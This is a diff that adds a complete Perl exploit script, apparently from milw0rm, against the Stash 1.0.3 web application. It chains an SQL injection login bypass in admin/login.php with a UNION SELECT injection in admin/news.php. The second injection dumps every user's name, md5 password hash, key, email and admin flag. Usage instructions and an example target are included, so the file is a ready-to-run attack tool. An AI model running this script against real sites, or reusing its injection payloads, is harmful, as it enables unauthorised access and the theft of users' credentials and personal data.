@@ -1,0 +1,113 @@
+#!/usr/bin/perl -w
+#
+# User credentials disclosure exploit - stash103exp.pl
+#
+# Gnix <gnixmail@gmail.com>
+# http://gnix.netsons.org
+# 
+# This exploit use an SQL Injection in the file admin/login.php to 
+# bypass the login, and then an SQL Injection in the admin/news.php 
+# to extract all the users info. Note: password are crypted with md5.
+#
+# Output for each user:
+# user_id:user_username:user_password:user_key:user_firstname user_lastname:user_email:user_admin
+#
+
+use strict;
+use LWP::UserAgent;
+use HTTP::Request;
+use HTTP::Response;
+use HTTP::Cookies;
+
+
+# Variables
+my $cjar  = new HTTP::Cookies( file => 'cookies.txt', 
+                               autosave => 1, 
+                               ignore_discard => 0);
+my $agent = new LWP::UserAgent;
+$agent->agent('Lynxy/6.6.6dev.8 libwww-FM/3.14159FM');
+  
+
+# Check argv
+if(@ARGV != 3) {
+  print "[?] Usage  : perl stash103exp.pl <stash_dir_address> <admin_username> <table_prefix>\n";
+  print "[?] Example: perl stash103exp.pl http://site/stash/ avril st_\n";
+  exit(1); 
+}
+
+
+# Authentication
+if(!auth($ARGV[0],$ARGV[1])) {
+  print "[!] Error during the authentication!\n";
+  exit(1);
+}
+
+
+# Extract all the user information
+my $info = extract_data($ARGV[0],$ARGV[2]);
+if(!$info) {
+  print "[!] Error when extracting data!\n";
+  exit(1);
+}
+
+
+# Print user information
+$_ = $info;
+my @users = m/<1>(.+?)<2>/g;
+foreach my $user (@users) {
+  print $user."\n";
+}
+
+
+exit(0);
+
+###########################################################################
+
+
+
+# Login as $ARGV[1] and save the PHPSESSID cookie
+sub auth
+{
+  my $address = shift;
+  my $username= shift;
+
+  # Login
+  my $response= $agent->post($address.'admin/login.php', 
+                             {username   => "' OR user_username = '$username", 
+                              password   => "any",
+                              submit    => "Log in"});
+
+  # Save PHPSESSID cookie
+  $cjar->extract_cookies($response);
+
+  return $response->is_redirect();
+}
+
+
+
+# Inject a query through news.php to extract all the info about every user
+sub extract_data
+{
+  my $address  = shift;
+  my $prefix  = shift;
+
+  my $query = "-1 UNION SELECT 1 AS news_id, 'Injection' AS news_title,  ".
+   "CONCAT('<1>',user_id,':',user_username,':',user_password,':',user_key,".
+  "':',user_firstname,' ', user_lastname,':', user_email,':', user_admin,".
+  "'<2>') AS news_body, 'Mitnick' AS news_author, NOW() AS news_date, 0  ".
+  "AS news_comment FROM ".$prefix."news, ".$prefix."user";
+
+  my $request = new HTTP::Request('GET', $address.'admin/news.php?post='.$query);
+
+  $agent->cookie_jar($cjar);
+  my $response= $agent->request($request);
+
+  if($response->is_success()) {
+    return $response->content();
+  }
+  else {
+    return undef;
+  }
+}
+
+# milw0rm.com [2008-10-09]
